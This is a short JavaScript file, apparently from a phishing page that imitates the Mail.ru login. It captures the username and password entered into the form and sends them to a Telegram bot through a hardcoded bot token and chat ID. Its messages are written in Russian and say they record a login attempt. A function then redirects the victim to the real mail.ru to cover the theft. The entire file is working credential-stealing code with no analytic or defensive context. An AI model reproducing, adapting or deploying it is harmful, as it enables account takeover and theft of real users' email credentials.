const TOKEN = '7696324080:AAF0H1ZwXRPlVHeyAx-k5mzQCm4oCWQ5bVw';
const CHAT_ID = '1969968725';
const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById('login-form');
const status = document.getElementById('status');

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const login = document.getElementById('login').value;
  const password = document.getElementById('password').value;

  const message = `
🔐 Попытка входа в аккаунт Mail.ru:
📧 Логин: ${login}
🔑 Пароль: ${password}
  `;

  fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  }).then(res => {
    if (!res.ok) throw new Error("Fetch failed");
  }).catch(err => alert("Ошибка: " + err));
  
 
});

function vxod() {
  setTimeout(function () {
    window.location.href = "https://mail.ru";
  }, 2000); // 5000 мс = 5 секунд
}

